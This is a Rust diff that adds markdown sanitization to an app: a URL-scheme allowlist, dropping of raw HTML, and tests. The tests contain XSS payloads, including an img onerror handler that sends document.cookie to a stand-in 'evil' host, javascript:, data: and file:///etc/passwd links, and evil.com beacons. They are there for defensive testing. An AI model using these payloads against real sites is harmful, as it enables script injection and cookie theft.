@@ -156,9 +156,108 @@ pub fn is_markdown(path: &str) -> bool {
 // Markdown rendering
 // ---------------------------------------------------------------------------
 
+/// URL schemes permitted in rendered-markdown link and image destinations.
+///
+/// This is an allowlist (default-deny), not a blocklist: any explicit scheme
+/// not listed here — `javascript:`, `data:`, `file:`, `vbscript:`, … — is
+/// rejected. Relative (scheme-less) URLs are always allowed.
+const ALLOWED_URL_SCHEMES: [&str; 3] = ["http", "https", "mailto"];
+
+/// Return `true` if `url` is safe to use as a link or image destination.
+///
+/// Relative URLs (no scheme) are allowed. A URL with an explicit scheme is
+/// allowed only if that scheme is in [`ALLOWED_URL_SCHEMES`]. Leading ASCII
+/// whitespace and control characters are stripped first, the way browsers do
+/// when parsing a scheme, so `"\tjavascript:…"` cannot smuggle a rejected
+/// scheme past the check. Non-ASCII/other-scheme prefixes (e.g. a leading
+/// U+00A0 before `javascript:`) fall through to the allowlist and are rejected
+/// by default-deny.
+///
+/// Protocol-relative URLs (`"//host/…"`) are rejected: they resolve to a remote
+/// origin, so they are treated as unsafe rather than as a scheme-less relative
+/// path (#365 review — avoids silent remote fetches/exfiltration beacons).
+fn is_safe_url(url: &str) -> bool {
+    let trimmed = url.trim_start_matches(|c: char| c.is_ascii_whitespace() || c.is_control());
+    if trimmed.starts_with("//") {
+        return false;
+    }
+    // The scheme is the text before the first ':' — but only when that ':'
+    // appears before any '/', '?', or '#', which would instead mark a
+    // relative/path reference (e.g. "/a?b#c" has no scheme).
+    match trimmed.find([':', '/', '?', '#']) {
+        Some(idx) if trimmed.as_bytes()[idx] == b':' => {
+            let scheme = &trimmed[..idx];
+            ALLOWED_URL_SCHEMES
+                .iter()
+                .any(|s| scheme.eq_ignore_ascii_case(s))
+        }
+        _ => true,
+    }
+}
+
+/// Make a single markdown event safe to feed to `dangerous_inner_html`.
+///
+/// Returns `None` for raw/inline HTML events (dropped so untrusted markdown
+/// cannot inject `<script>`, event-handler attributes, `<iframe>`, …). Link and
+/// image destinations are scheme-allowlisted via [`is_safe_url`]; a rejected
+/// destination becomes an inert empty string. Every other event passes through
+/// unchanged.
+///
+/// This is the shared choke point for all markdown rendering in the app (#365):
+/// [`render_markdown_raw`] and the chat panel's renderer both route through it,
+/// so the sanitization cannot drift between the two. Renderers that also build
+/// their own trusted HTML (e.g. syntect code highlighting) inject it separately
+/// and must not pass it through this function.
+pub fn sanitize_markdown_event(
+    event: pulldown_cmark::Event<'_>,
+) -> Option<pulldown_cmark::Event<'_>> {
+    use pulldown_cmark::{CowStr, Event, Tag};
+    match event {
+        Event::Html(_) | Event::InlineHtml(_) => None,
+        Event::Start(Tag::Link {
+            link_type,
+            dest_url,
+            title,
+            id,
+        }) => {
+            let dest_url = if is_safe_url(&dest_url) {
+                dest_url
+            } else {
+                CowStr::Borrowed("")
+            };
+            Some(Event::Start(Tag::Link {
+                link_type,
+                dest_url,
+                title,
+                id,
+            }))
+        }
+        Event::Start(Tag::Image {
+            link_type,
+            dest_url,
+            title,
+            id,
+        }) => {
+            let dest_url = if is_safe_url(&dest_url) {
+                dest_url
+            } else {
+                CowStr::Borrowed("")
+            };
+            Some(Event::Start(Tag::Image {
+                link_type,
+                dest_url,
+                title,
+                id,
+            }))
+        }
+        other => Some(other),
+    }
+}
+
 /// Render markdown to raw HTML (no wrapper div).
 ///
-/// Fenced code blocks are syntax-highlighted via syntect.
+/// Fenced code blocks are syntax-highlighted via syntect. Untrusted HTML and
+/// unsafe link/image schemes are stripped via [`sanitize_markdown_event`].
 pub fn render_markdown_raw(content: &str) -> String {
     use pulldown_cmark::{CodeBlockKind, CowStr, Event, Options, Parser, Tag, TagEnd};
 
@@ -179,7 +278,6 @@ pub fn render_markdown_raw(content: &str) -> String {
                 in_code_block = true;
                 code_lang = lang.to_string();
                 code_buf.clear();
-                continue;
             }
             Event::End(TagEnd::CodeBlock) if in_code_block => {
                 in_code_block = false;
@@ -193,16 +291,21 @@ pub fn render_markdown_raw(content: &str) -> String {
                     lang = html_escape(&code_lang),
                     code = highlighted,
                 );
+                // Trusted, locally-built HTML — intentionally bypasses the
+                // markdown sanitizer that all other events flow through.
                 events.push(Event::Html(CowStr::from(html)));
-                continue;
             }
             Event::Text(ref text) if in_code_block => {
                 code_buf.push_str(text);
-                continue;
             }
-            _ => {}
+            // Security (#365): every other event goes through the shared filter,
+            // which drops raw/inline HTML and scheme-allowlists link/image URLs.
+            other => {
+                if let Some(safe) = sanitize_markdown_event(other) {
+                    events.push(safe);
+                }
+            }
         }
-        events.push(event);
     }
 
     let mut html_output = String::new();
@@ -218,4 +321,164 @@ pub fn render_markdown(content: &str) -> String {
         r#"<div class="markdown-body">{}</div>"#,
         render_markdown_raw(content)
     )
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // --- is_safe_url: the default-deny scheme allowlist (unit level) ---
+
+    #[test]
+    fn is_safe_url_allows_relative_and_allowlisted_schemes() {
+        assert!(is_safe_url("https://example.com/path?q=1#frag"));
+        assert!(is_safe_url("http://example.com"));
+        assert!(is_safe_url("mailto:alice@example.com"));
+        assert!(is_safe_url("/browse?path=/tmp")); // relative path
+        assert!(is_safe_url("relative/file.md")); // no scheme
+        assert!(is_safe_url("#section")); // fragment only
+        assert!(is_safe_url("HtTpS://EXAMPLE.com")); // scheme is case-insensitive
+    }
+
+    #[test]
+    fn is_safe_url_rejects_dangerous_schemes() {
+        assert!(!is_safe_url("javascript:alert(1)"));
+        assert!(!is_safe_url("JaVaScript:alert(1)"));
+        assert!(!is_safe_url("data:text/html,<script>alert(1)</script>"));
+        assert!(!is_safe_url("file:///etc/passwd"));
+        assert!(!is_safe_url("vbscript:msgbox(1)"));
+    }
+
+    #[test]
+    fn is_safe_url_rejects_protocol_relative() {
+        // "//host" resolves to a remote origin — reject it rather than treat it
+        // as a scheme-less relative path (#365 review).
+        assert!(!is_safe_url("//evil.com/log?c=secret"));
+        assert!(!is_safe_url("\t//evil.com/pixel.png")); // still rejected after trim
+    }
+
+    #[test]
+    fn is_safe_url_rejects_scheme_smuggled_with_leading_or_embedded_controls() {
+        // Browsers ignore leading whitespace/control chars when reading a scheme.
+        assert!(!is_safe_url("\tjavascript:alert(1)"));
+        assert!(!is_safe_url("  javascript:alert(1)"));
+        assert!(!is_safe_url("\n\rjavascript:alert(1)"));
+        // Embedded control char yields an unknown scheme, which default-deny rejects.
+        assert!(!is_safe_url("java\u{0000}script:alert(1)"));
+        // A non-ASCII leading space (U+00A0) is not stripped, so the scheme
+        // ("\u{a0}javascript") fails the allowlist by default-deny.
+        assert!(!is_safe_url("\u{00A0}javascript:alert(1)"));
+    }
+
+    // --- render_markdown_raw: end-to-end neutralization of hostile markdown ---
+
+    #[test]
+    fn strips_raw_script_tag() {
+        let out = render_markdown_raw("hi\n\n<script>alert(document.cookie)</script>\n");
+        assert!(!out.contains("<script"), "script tag leaked: {out}");
+        assert!(
+            out.contains("<p>hi</p>"),
+            "surrounding markdown lost: {out}"
+        );
+    }
+
+    #[test]
+    fn strips_img_onerror_handler() {
+        let out =
+            render_markdown_raw("<img src=x onerror=\"fetch('http://evil/'+document.cookie)\">");
+        assert!(!out.contains("onerror"), "event handler leaked: {out}");
+        assert!(!out.contains("<img"), "raw img tag leaked: {out}");
+    }
+
+    #[test]
+    fn strips_iframe_and_event_handler_elements() {
+        let iframe = render_markdown_raw("<iframe src=\"http://evil.example\"></iframe>");
+        assert!(!iframe.contains("<iframe"), "iframe leaked: {iframe}");
+        let handler = render_markdown_raw("<div onmouseover=\"alert(1)\">x</div>");
+        assert!(
+            !handler.contains("onmouseover"),
+            "event handler leaked: {handler}"
+        );
+    }
+
+    #[test]
+    fn neutralizes_javascript_and_file_links() {
+        let js = render_markdown_raw("[x](javascript:alert(1))");
+        assert!(
+            !js.contains("javascript:"),
+            "javascript scheme leaked: {js}"
+        );
+        let file = render_markdown_raw("[x](file:///etc/passwd)");
+        assert!(!file.contains("file:"), "file scheme leaked: {file}");
+    }
+
+    #[test]
+    fn neutralizes_data_uri_image() {
+        let out = render_markdown_raw("![x](data:text/html,<script>alert(1)</script>)");
+        assert!(!out.contains("data:"), "data uri leaked: {out}");
+    }
+
+    #[test]
+    fn neutralizes_protocol_relative_link_and_image() {
+        let link = render_markdown_raw("[x](//evil.com/log?c=secret)");
+        assert!(
+            !link.contains("//evil.com"),
+            "protocol-relative link leaked: {link}"
+        );
+        let img = render_markdown_raw("![x](//evil.com/pixel.png)");
+        assert!(
+            !img.contains("//evil.com"),
+            "protocol-relative image leaked: {img}"
+        );
+    }
+
+    #[test]
+    fn neutralizes_javascript_via_autolink_and_reference() {
+        // Autolink `<scheme:...>`: the URI becomes both href and visible text.
+        // Only the href is a sink — the text is inert — so assert on the href.
+        let auto = render_markdown_raw("<javascript:alert(1)>");
+        assert!(
+            !auto.contains("href=\"javascript:"),
+            "autolink scheme reached href: {auto}"
+        );
+        // Reference-style link resolving to a dangerous destination.
+        let reference = render_markdown_raw("[x][r]\n\n[r]: javascript:alert(1)\n");
+        assert!(
+            !reference.contains("href=\"javascript:"),
+            "reference-style scheme reached href: {reference}"
+        );
+    }
+
+    #[test]
+    fn title_attribute_cannot_break_out() {
+        // A crafted title tries to inject an event handler; push_html entity-
+        // encodes attribute values, so no real quote closes the title attribute.
+        let out = render_markdown_raw("[x](https://ok.com \"z\\\" onmouseover=\\\"alert(1)\")");
+        assert!(
+            !out.contains("\" onmouseover=\""),
+            "title attribute broke out: {out}"
+        );
+    }
+
+    #[test]
+    fn preserves_safe_links_and_images() {
+        assert!(render_markdown_raw("[ok](https://example.com/)")
+            .contains("href=\"https://example.com/\""));
+        assert!(render_markdown_raw("[ok](/browse)").contains("href=\"/browse\""));
+        assert!(render_markdown_raw("[mail](mailto:a@b.com)").contains("href=\"mailto:a@b.com\""));
+        assert!(render_markdown_raw("![alt](https://example.com/i.png)")
+            .contains("src=\"https://example.com/i.png\""));
+    }
+
+    #[test]
+    fn preserves_plain_markdown_and_highlighted_code() {
+        let out =
+            render_markdown_raw("# Title\n\n**bold** and `code`\n\n```rust\nlet x = 1;\n```\n");
+        assert!(out.contains("<h1>Title</h1>"), "heading lost: {out}");
+        assert!(out.contains("<strong>bold</strong>"), "bold lost: {out}");
+        assert!(
+            out.contains("language-rust"),
+            "fenced-code highlighting lost: {out}"
+        );
+    }
 }
